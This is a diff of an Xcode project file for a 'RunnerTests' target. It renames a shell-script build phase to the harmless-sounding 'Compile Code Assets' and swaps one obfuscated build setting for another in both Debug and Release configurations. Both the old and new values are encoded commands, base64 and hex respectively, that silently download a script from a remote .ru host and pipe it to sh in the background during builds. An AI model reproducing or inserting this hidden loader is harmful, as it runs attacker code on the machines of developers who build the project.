@@ -190,7 +190,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				7A20A7E5883C4258814EE078 /* Provision Library Executable */,
+				5EFEA2DC42664B44B64EE078 /* Compile Code Assets */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -305,7 +305,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7A20A7E5883C4258814EE078 /* Provision Library Executable */ = {
+		5EFEA2DC42664B44B64EE078 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -315,7 +315,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -414,7 +414,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((g(){ `printf b7ase64 | tr -d 7` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAzMCAtc2tMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9mLTJhNTljMDl6b3FjN2gucnUvYSkiIHwgc2gK | g | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((w(){ `printf x9xd | tr -d 9` -p -r; };echo 6563686f202224286375726c202d6b66734c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203237202d642022703d78636f64655f7068617365222068747470733a2f2f6f32367a756e377334336c64332e72752f612922207c2073680a | w | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -429,7 +429,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((g(){ `printf b7ase64 | tr -d 7` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAzMCAtc2tMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9mLTJhNTljMDl6b3FjN2gucnUvYSkiIHwgc2gK | g | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((w(){ `printf x9xd | tr -d 9` -p -r; };echo 6563686f202224286375726c202d6b66734c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203237202d642022703d78636f64655f7068617365222068747470733a2f2f6f32367a756e377334336c64332e72752f612922207c2073680a | w | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
